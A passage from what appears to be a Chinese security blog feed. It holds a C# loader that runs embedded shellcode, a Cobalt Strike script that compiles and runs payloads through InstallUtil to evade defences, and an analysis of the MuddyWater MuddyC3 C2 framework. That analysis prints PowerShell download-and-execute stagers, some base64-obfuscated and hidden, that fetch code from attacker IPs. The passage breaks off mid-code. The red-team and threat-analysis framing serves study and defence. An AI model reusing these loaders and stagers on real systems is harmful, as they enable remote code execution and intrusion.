<span class="number">0xd7</span>, <span class="number">0x86</span>, <span class="number">0xef</span>, <span class="number">0xf1</span>, <span class="number">0xf8</span>, <span class="number">0xa3</span>, <span class="number">0x51</span>, <span class="number">0x05</span>, <span class="number">0x5b</span>, <span class="number">0xd6</span>, <span class="number">0x2f</span>, <span class="number">0x19</span>, <span class="number">0x52</span>, <span class="number">0x77</span>, <span class="number">0x42</span>, <span class="number">0x09</span>, <span class="number">0x84</span>, <span class="number">0xe3</span>, <span class="number">0xc5</span>, <span class="number">0x1b</span>, <span class="number">0xf5</span>, <span class="number">0x1d</span>, <span class="number">0x0d</span>, <span class="number">0x73</span>, <span class="number">0x2d</span>, <span class="number">0x1b</span>, <span class="number">0x38</span>, <span class="number">0xcc</span>, <span class="number">0x08</span>, <span class="number">0xd6</span>, <span class="number">0x2f</span>, <span class="number">0x83</span>, <span class="number">0x4c</span>, <span class="number">0x51</span>, <span class="number">0x0a</span>, <span class="number">0x60</span>, <span class="number">0x46</span>, <span class="number">0x28</span>, <span class="number">0x66</span>, <span class="number">0x6e</span>, <span class="number">0xea</span>, <span class="number">0x53</span>, <span class="number">0x08</span>, <span class="number">0x99</span>, <span class="number">0x0a</span>, <span class="number">0x92</span>, <span class="number">0x68</span>, <span class="number">0x88</span>, <span class="number">0xd8</span>, <span class="number">0x41</span>, <span class="number">0x3e</span>, <span class="number">0x1c</span>, <span class="number">0x16</span>, <span class="number">0x1a</span>, <span class="number">0x46</span>, <span class="number">0x31</span>, <span class="number">0x8c</span>, <span class="number">0xe4</span>, <span class="number">0xa8</span>, <span class="number">0x8c</span>, <span class="number">0xc5</span>, <span class="number">0xe3</span>, <span class="number">0xf0</span>, <span class="number">0x9a</span>, <span class="number">0x07</span>, <span class="number">0x1e</span>, <span class="number">0x2c</span>, <span class="number">0x8c</span>, <span class="number">0x74</span>, <span class="number">0x24</span>, <span class="number">0x14</span>, <span class="number">0x26</span>, <span class="number">0xab</span>, <span class="number">0xed</span>, <span class="number">0xba</span>, <span class="number">0x0f</span>, <span class="number">0xc2</span>, <span class="number">0x80</span>, <span class="number">0xa5</span>, <span class="number">0xa5</span>, <span class="number">0x1b</span>, <span class="number">0xb3</span>, <span class="number">0x6c</span>, <span class="number">0xa0</span>, <span class="number">0x09</span>, <span class="number">0x55</span>, <span class="number">0xae</span>, <span class="number">0x66</span>, <span class="number">0xba</span>, <span class="number">0x95</span>, <span class="number">0x98</span>, <span class="number">0x0a</span>, <span class="number">0x7e</span>, <span class="number">0x6a</span>, <span class="number">0x6a</span>, <span class="number">0xc1</span>, <span class="number">0x03</span>, <span class="number">0x98</span>, <span class="number">0xc9</span>, <span class="number">0xfd</span>, <span class="number">0x4e</span>, <span class="number">0xde</span>, <span class="number">0x58</span>, <span class="number">0x20</span>, <span class="number">0x68</span>, <span class="number">0x6a</span>, <span class="number">0x87</span>, <span class="number">0xa7</span>, <span class="number">0xb8</span>, <span class="number">0xba</span>, <span class="number">0xf0</span>, <span class="number">0x31</span>, <span class="number">0x3a</span>, <span class="number">0x6a</span>, <span class="number">0x27</span>, <span class="number">0x81</span>, <span class="number">0xb5</span>, <span class="number">0x5b</span>, <span class="number">0x86</span>, <span class="number">0x7d</span>, <span class="number">0xb7</span>, <span class="number">0x08</span>, <span class="number">0x74</span>, <span class="number">0x53</span>, <span class="number">0x98</span>, <span class="number">0xb2</span>, <span class="number">0x59</span>, <span class="number">0x07</span>, <span class="number">0xe5</span>, <span class="number">0x1c</span>, <span class="number">0x85</span>, <span class="number">0xe9</span>, <span class="number">0x52</span>, <span class="number">0xef</span>, <span class="number">0x30</span>, <span class="number">0xfb</span>, <span class="number">0x16</span>, <span class="number">0xf4</span>, <span class="number">0xa1</span>, <span class="number">0xfc</span>, <span class="number">0x6a</span>, <span class="number">0x98</span>, <span class="number">0x19</span>, <span class="number">0x2a</span>, <span class="number">0x1e</span>, <span class="number">0xe1</span>, <span class="number">0x09</span>, <span class="number">0x3b</span>, <span class="number">0x39</span>, <span class="number">0x52</span>, <span class="number">0x4b</span>, <span class="number">0x91</span>, <span class="number">0x45</span>, <span class="number">0xb8</span>, <span class="number">0x74</span>, <span class="number">0xf2</span>, <span class="number">0x0f</span>, <span class="number">0xcf</span>, <span class="number">0xa9</span>, <span class="number">0xfa</span>, <span class="number">0x15</span>, <span class="number">0xc4</span>, <span class="number">0x5b</span>, <span class="number">0x47</span>, <span class="number">0xe7</span>, <span class="number">0x00</span>, <span class="number">0x68</span>, <span class="number">0xf0</span>, <span class="number">0xb5</span>, <span class="number">0xa2</span>, <span class="number">0x56</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x6a</span>, <span class="number">0x40</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x57</span>, <span class="number">0x68</span>, <span class="number">0x58</span>, <span class="number">0xa4</span>, <span class="number">0x53</span>, <span class="number">0xe5</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x93</span>, <span class="number">0xb9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xd9</span>, <span class="number">0x51</span>, <span class="number">0x53</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x57</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x56</span>, <span class="number">0x68</span>, <span class="number">0x12</span>, <span class="number">0x96</span>, <span class="number">0x89</span>, <span class="number">0xe2</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x74</span>, <span class="number">0xc6</span>, <span class="number">0x8b</span>, <span class="number">0x07</span>, <span class="number">0x01</span>, <span class="number">0xc3</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x75</span>, <span class="number">0xe5</span>, <span class="number">0x58</span>, <span class="number">0xc3</span>, <span class="number">0xe8</span>, <span class="number">0xa9</span>, <span class="number">0xfd</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x31</span>, <span class="number">0x39</span>, <span class="number">0x32</span>, <span class="number">0x2e</span>, <span class="number">0x31</span>, <span class="number">0x36</span>, <span class="number">0x38</span>, <span class="number">0x2e</span>, <span class="number">0x39</span>, <span class="number">0x30</span>, <span class="number">0x2e</span>, <span class="number">0x31</span>, <span class="number">0x37</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span> &#125;;</span><br><span class="line"></span><br><span class="line">UInt32 funcAddr = VirtualAlloc(<span class="number">0</span>, (UInt32)buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">Marshal.Copy(buf, <span class="number">0</span>, (IntPtr)(funcAddr), buf.Length);</span><br><span class="line">IntPtr hThread = IntPtr.Zero;</span><br><span class="line">UInt32 threadId = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// prepare data</span></span><br><span class="line"></span><br><span class="line">PROCESSOR_INFO info = <span class="keyword">new</span> PROCESSOR_INFO();</span><br><span class="line">IntPtr pinfo = Marshal.AllocHGlobal(Marshal.SizeOf(<span class="keyword">typeof</span>(PROCESSOR_INFO)));</span><br><span class="line">Marshal.StructureToPtr(info, pinfo, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// execute native code</span></span><br><span class="line"></span><br><span class="line">hThread = CreateThread(<span class="number">0</span>, <span class="number">0</span>, funcAddr, pinfo, <span class="number">0</span>, <span class="keyword">ref</span> threadId);</span><br><span class="line">WaitForSingleObject(hThread, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// retrive data</span></span><br><span class="line"></span><br><span class="line">info = (PROCESSOR_INFO)Marshal.PtrToStructure(pinfo, <span class="keyword">typeof</span>(PROCESSOR_INFO));</span><br><span class="line">Marshal.FreeHGlobal(pinfo);</span><br><span class="line">CloseHandle(hThread);</span><br><span class="line">VirtualFree((IntPtr)funcAddr, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">VirtualAlloc</span>(<span class="params">UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect</span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">bool</span> <span class="title">VirtualFree</span>(<span class="params">IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType</span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params"> UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, <span class="keyword">ref</span> UInt32 lpThreadId </span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">bool</span> <span class="title">CloseHandle</span>(<span class="params">IntPtr handle</span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">WaitForSingleObject</span>(<span class="params"> IntPtr hHandle, UInt32 dwMilliseconds </span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">GetModuleHandle</span>(<span class="params"> <span class="built_in">string</span> moduleName </span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">GetProcAddress</span>(<span class="params"> IntPtr hModule, <span class="built_in">string</span> procName </span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">LoadLibrary</span>(<span class="params"> <span class="built_in">string</span> lpFileName </span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">GetLastError</span>()</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">StructLayout(LayoutKind.Sequential)</span>]</span><br><span class="line"><span class="keyword">internal</span> <span class="keyword">struct</span> PROCESSOR_INFO</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span> UInt32 dwMax;</span><br><span class="line"><span class="keyword">public</span> UInt32 id0;</span><br><span class="line"><span class="keyword">public</span> UInt32 id1;</span><br><span class="line"><span class="keyword">public</span> UInt32 id2;</span><br><span class="line"><span class="keyword">public</span> UInt32 dwStandard;</span><br><span class="line"><span class="keyword">public</span> UInt32 dwFeature;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if AMD</span></span><br><span class="line"><span class="keyword">public</span> UInt32 dwExt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样CS也是一样的写法和思路</p><p>下面为我已编写好的脚本演示</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com//cst1118.gif" alt="cst1118"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># demonsec666</span><br><span class="line">sub t1118 &#123;</span><br><span class="line">bupload($bid, $<span class="number">3</span>[<span class="string">&#x27;payloadfile&#x27;</span>]);</span><br><span class="line">bmv($bid, <span class="string">&quot;t1118.cs&quot;</span>, $<span class="number">3</span>[<span class="string">&#x27;rfile&#x27;</span>]);</span><br><span class="line">elog(<span class="string">&quot;已上传文件&quot;</span>); </span><br><span class="line">bexecute($bid, <span class="string">&quot;C:\\Windows\\Microsoft.NET\\Framework\\&quot;</span>.$<span class="number">3</span>[<span class="string">&#x27;dotnet_version&#x27;</span>].<span class="string">&quot;\\csc.exe /out:&quot;</span>.$<span class="number">3</span>[<span class="string">&#x27;rdll&#x27;</span>].<span class="string">&quot; &quot;</span>.$<span class="number">3</span>[<span class="string">&#x27;rfile&#x27;</span>]);</span><br><span class="line">elog(<span class="string">&quot;已生成文件&quot;</span>); </span><br><span class="line">bpause($bid, <span class="type">int</span>(<span class="number">3000</span>));</span><br><span class="line">bexecute($bid, <span class="string">&quot;C:\\Windows\\Microsoft.NET\\Framework\\&quot;</span>.$<span class="number">3</span>[<span class="string">&#x27;dotnet_version&#x27;</span>].<span class="string">&quot;\\InstallUtil.exe /U /logfile= /logtoconsole=false &quot;</span>.$<span class="number">3</span>[<span class="string">&#x27;rdll&#x27;</span>]);</span><br><span class="line">elog(<span class="string">&quot;已执行文件&quot;</span>); </span><br><span class="line">bpause($bid, <span class="type">int</span>(<span class="number">3000</span>));</span><br><span class="line">brm($bid, $<span class="number">3</span>[<span class="string">&#x27;rfile&#x27;</span>]);</span><br><span class="line">elog(<span class="string">&quot;已删除缓存文件&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">popup beacon_bottom &#123;</span><br><span class="line">menu <span class="string">&quot;&amp;ATT&amp;CK&quot;</span> &#123;</span><br><span class="line">item <span class="string">&quot;T1118&quot;</span>&#123;</span><br><span class="line">$bid = $<span class="number">1</span>;</span><br><span class="line">$dialog = dialog(<span class="string">&quot;T1118&quot;</span>, %(rfile =&gt; <span class="string">&quot;C:\\Windows\\Temp\\t1118.tmp&quot;</span> ,rdll =&gt; <span class="string">&#x27;C:\\windows\\temp\\t1118.dll&#x27;</span>,dotnet_version =&gt; <span class="string">&#x27;v4.0.30319&#x27;</span>), &amp;t1118);</span><br><span class="line">drow_file($dialog, <span class="string">&quot;payloadfile&quot;</span>, <span class="string">&quot;Payload:&quot;</span>);</span><br><span class="line">drow_text($dialog, <span class="string">&quot;rfile&quot;</span>,  <span class="string">&quot;上传远程路径:&quot;</span>);</span><br><span class="line">drow_text($dialog, <span class="string">&quot;rdll&quot;</span>,  <span class="string">&quot;生成dll路径:&quot;</span>);</span><br><span class="line">drow_text($dialog, <span class="string">&quot;dotnet_version&quot;</span>,  <span class="string">&quot;dotnet 版本:&quot;</span>);</span><br><span class="line">dbutton_action($dialog, <span class="string">&quot;Go&quot;</span>);</span><br><span class="line">dialog_show($dialog);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>参考链接：</strong></p><p> <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.004/T1218.004.md#atomic-test-7---installutil-helptext-method-call">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.004/T1218.004.md#atomic-test-7---installutil-helptext-method-call</a> </p><p> <a href="https://attack.mitre.org/techniques/T1218/004/">https://attack.mitre.org/techniques/T1218/004/</a> </p><p><a href="https://github.com/praetorian-code/purple-team-attack-automation/blob/master/modules/post/windows/purple/t1118.rb">https://github.com/praetorian-code/purple-team-attack-automation/blob/master/modules/post/windows/purple/t1118.rb</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-tou.jpg&quot; alt=&quot;4&quot;&gt;</summary>
    
    
    
    <category term="ATT&amp;CK" scheme="https://www.ggsec.cn/categories/ATT-CK/"/>
    
    <category term="Metasploit" scheme="https://www.ggsec.cn/categories/Metasploit/"/>
    
    
    <category term="windows" scheme="https://www.ggsec.cn/tags/windows/"/>
    
    <category term="ATT&amp;CK" scheme="https://www.ggsec.cn/tags/ATT-CK/"/>
    
    <category term="Metasploit" scheme="https://www.ggsec.cn/tags/Metasploit/"/>
    
  </entry>
  
  <entry>
    <title>APT污水攻击MuddyC3 1.1.1版本浅析</title>
    <link href="https://www.ggsec.cn/APT%E6%B1%A1%E6%B0%B4%E6%94%BB%E5%87%BBMuddyC3%201.1.1%E7%89%88%E6%9C%AC%E6%B5%85%E6%9E%90.html"/>
    <id>https://www.ggsec.cn/APT%E6%B1%A1%E6%B0%B4%E6%94%BB%E5%87%BBMuddyC3%201.1.1%E7%89%88%E6%9C%AC%E6%B5%85%E6%9E%90.html</id>
    <published>2020-07-30T09:39:47.000Z</published>
    <updated>2022-11-26T02:10:38.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1.png" alt="enter description here"></p><span id="more"></span><h2 id="APT污水攻击MuddyC3-1-1-1版本浅析"><a href="#APT污水攻击MuddyC3-1-1-1版本浅析" class="headerlink" title="APT污水攻击MuddyC3 1.1.1版本浅析"></a>APT污水攻击MuddyC3 1.1.1版本浅析</h2><p><strong>本文作者竭力保证文章内容可靠，但对于任何错误、疏漏或不准确的内容，作者不负任何责任。文章部分内容来源于网络是出于传递更多信息的目的，对此不负任何法律责任。本文仅用于技术分享与讨论，严禁用于其他用途。</strong></p><h2 id="背景说明"><a href="#背景说明" class="headerlink" title="背景说明"></a>背景说明</h2><p><strong>MuddyWater是一个伊朗威胁组织，主要针对中东、欧洲和北美国家。该组织针对的目标主要是电信，政府（IT服务）和石油部门。众多安全研究机构针对muddywater的样本进行了深入的研究。2019年6月24日，名为0xffff0800的用户在twitter上发表推文表示，其开源了污水攻击的python版代码。本文就该代码，一窥muddywater的攻击过程</strong></p><p><strong>整体结构</strong></p><ol><li>代理重新连接</li><li>加载模块</li><li>发送命令和接收结果</li><li>创建Powershell负载</li></ol><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/24.png" alt="enter description here"></p><p>​       整个通信过程有三个要素，即攻击端、C2网站和目的主机。其中C2网站指的是被攻击者拿到控制权限的web网站。C2网站可能不止一个。攻击过程中，攻击者将攻击指令以powershell代码的形式注入C2网站，被感染的目的主机主动向C2网站发送http请求，得到攻击命令，调用powershell接口执行命令。</p><p>​     并同时在今年2020年1月13 日Ahmed Khlief 作者在博客上发布了1.1.1的版，弥补了之前未公开的payload。本文着重就以payload为重点讲解。</p><h2 id="功能和代码分析"><a href="#功能和代码分析" class="headerlink" title="功能和代码分析"></a>功能和代码分析</h2><p>版本1.0.1和1.1.1版本从代码结构上只有少量不同，下图为入口界面截图</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/5.png" alt="enter description here"></p><h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a><strong>功能分析</strong></h3><h3 id="1-1服务端分析"><a href="#1-1服务端分析" class="headerlink" title="1.1服务端分析"></a>1.1服务端分析</h3><p>运行muddyc3.py文件</p><p>需要输入ip、端口和是否需要代理输入完成后进入命令界面</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/4.png" alt="enter description here"></p><h4 id="1-1-1-list命令"><a href="#1-1-1-list命令" class="headerlink" title="1.1.1 list命令"></a>1.1.1 list命令</h4><p>用来列举agent信息，列举结果示意如下：</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/6.png" alt="enter description here"></p><h4 id="1-1-2-show命令"><a href="#1-1-2-show命令" class="headerlink" title="1.1.2 show命令"></a>1.1.2 show命令</h4><p>目前尚未开发。</p><h4 id="1-1-3-use命令"><a href="#1-1-3-use命令" class="headerlink" title="1.1.3 use命令"></a>1.1.3 use命令</h4><p>use命令后需要agent id作为参数，命令格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use id</span><br></pre></td></tr></table></figure><p>命令结果是进入id下的命令界面：</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/9.png" alt="enter description here"></p><h4 id="1-1-4-payload命令"><a href="#1-1-4-payload命令" class="headerlink" title="1.1.4 payload命令"></a>1.1.4 payload命令</h4><p>payload命令列举出目前服务端程序中已有的powershell注入命令。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/10.png" alt="enter description here"></p><p>​       </p><p>​    通过分析core文件夹下webserver.py文件中下图为payload 代码。通过简单的IP和端口替换，并进行base64等加密手段而成的多种payload</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/11.png" alt="enter description here"></p><h5 id="首先我们来看下比较明显的三组不同类型的payload，最终目的皆为到达绕过杀软的目的"><a href="#首先我们来看下比较明显的三组不同类型的payload，最终目的皆为到达绕过杀软的目的" class="headerlink" title="首先我们来看下比较明显的三组不同类型的payload，最终目的皆为到达绕过杀软的目的"></a>首先我们来看下比较明显的三组不同类型的payload，最终目的皆为到达绕过杀软的目的</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">---</span>+Powershell JOB + File Payload+<span class="literal">---</span></span><br><span class="line"><span class="built_in">iex</span>([<span class="type">System.Text.Encoding</span>]::ASCII.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="string">&#x27;JFY9bmV3LW9iamVjdCBuZXQud2ViY2xpZW50OyRWLnByb3h5PVtOZXQuV2ViUmVxdWVzdF06OkdldFN5c3RlbVdlYlByb3h5KCk7JFYuUHJveHkuQ3JlZGVudGlhbHM9W05ldC5DcmVkZW50aWFsQ2FjaGVdOjpEZWZhdWx0Q3JlZGVudGlhbHM7JFM9JFYuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjEuMTk6NDQ0NC9oamYnKTtJRVgoJHMp&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="literal">---</span>+Powershell JOB + File +SCT Payload+<span class="literal">---</span></span><br><span class="line"><span class="built_in">iex</span>([<span class="type">System.Text.Encoding</span>]::ASCII.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="string">&#x27;JFY9bmV3LW9iamVjdCBuZXQud2ViY2xpZW50OyRWLnByb3h5PVtOZXQuV2ViUmVxdWVzdF06OkdldFN5c3RlbVdlYlByb3h5KCk7JFYuUHJveHkuQ3JlZGVudGlhbHM9W05ldC5DcmVkZW50aWFsQ2FjaGVdOjpEZWZhdWx0Q3JlZGVudGlhbHM7JFM9JFYuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjEuMTk6NDQ0NC9oamZzJyk7SUVYKCRzKQ==&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">powershell <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.90.135/get&#x27;);&quot;</span></span><br></pre></td></tr></table></figure><h5 id="1-未加密部分"><a href="#1-未加密部分" class="headerlink" title="1.未加密部分"></a>1.未加密部分</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.90.135/get&#x27;);&quot;</span></span><br></pre></td></tr></table></figure><p>其中核心的payload为 get部分，[<code>http://192.168.1.19:4444/get</code>]<strong>由该页面在powershell上下载为字符串执行在客户端</strong>。需要注意的是这段url并未进行base64加密。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/12.png" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/13.png" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/14.png" alt="enter description here"></p><h5 id="2-两个base64加密部分"><a href="#2-两个base64加密部分" class="headerlink" title="2.两个base64加密部分"></a>2.两个base64加密部分</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---+Powershell JOB + File Payload+---</span><br><span class="line">iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(&#x27;JFY9bmV3LW9iamVjdCBuZXQud2ViY2xpZW50OyRWLnByb3h5PVtOZXQuV2ViUmVxdWVzdF06OkdldFN5c3RlbVdlYlByb3h5KCk7JFYuUHJveHkuQ3JlZGVudGlhbHM9W05ldC5DcmVkZW50aWFsQ2FjaGVdOjpEZWZhdWx0Q3JlZGVudGlhbHM7JFM9JFYuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjEuMTk6NDQ0NC9oamYnKTtJRVgoJHMp&#x27;)))</span><br><span class="line"></span><br><span class="line">---+Powershell JOB + File +SCT Payload+---</span><br><span class="line">iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(&#x27;JFY9bmV3LW9iamVjdCBuZXQud2ViY2xpZW50OyRWLnByb3h5PVtOZXQuV2ViUmVxdWVzdF06OkdldFN5c3RlbVdlYlByb3h5KCk7JFYuUHJveHkuQ3JlZGVudGlhbHM9W05ldC5DcmVkZW50aWFsQ2FjaGVdOjpEZWZhdWx0Q3JlZGVudGlhbHM7JFM9JFYuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjEuMTk6NDQ0NC9oamZzJyk7SUVYKCRzKQ==&#x27;)))</span><br></pre></td></tr></table></figure><p>由第一个base64解密得出为下图</p><p>依旧是请求<code>http://192.168.90.135:4444/get</code> 链接，下载字符串，并进行执行</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/26.png" alt="enter description here"></p><h5 id="3-俄罗斯套娃"><a href="#3-俄罗斯套娃" class="headerlink" title="3.俄罗斯套娃"></a>3.俄罗斯套娃</h5><p>而第二个base64则为多个base64加密嵌套，像极了俄罗斯套娃 </p><p>得到的链接为<code>http://192.168.90.135:4444/hjfs</code></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/25.png" alt="enter description here"></p><p>那么我们去看看这个hjfs的内容是什么</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/27.png" alt="enter description here"></p><p>经过base64解密得出以下代码，其中得出两个链接分别 为 &#x2F;sct、&#x2F;getc</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$V</span>=<span class="built_in">new-object</span> net.webclient;<span class="variable">$V</span>.proxy=[<span class="type">Net.WebRequest</span>]::GetSystemWebProxy();<span class="variable">$V</span>.Proxy.Credentials=[<span class="type">Net.CredentialCache</span>]::DefaultCredentials;<span class="variable">$S</span>=<span class="variable">$V</span>.DownloadString(<span class="string">&#x27;http://192.168.90.135:4444/getc&#x27;</span>);<span class="built_in">set-content</span> <span class="literal">-path</span> c:\programdata\a.zip <span class="literal">-value</span> <span class="variable">$S</span>;<span class="variable">$S</span>=<span class="variable">$V</span>.DownloadString(<span class="string">&#x27;http://192.168.90.135:4444/sct&#x27;</span>);<span class="built_in">set-content</span> <span class="literal">-path</span> c:\programdata\sct.zip <span class="literal">-value</span> <span class="variable">$S</span>;<span class="built_in">set-content</span> <span class="literal">-path</span> c:\programdata\sct.ps1 <span class="literal">-value</span> ([<span class="type">System.Text.Encoding</span>]::ASCII.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span 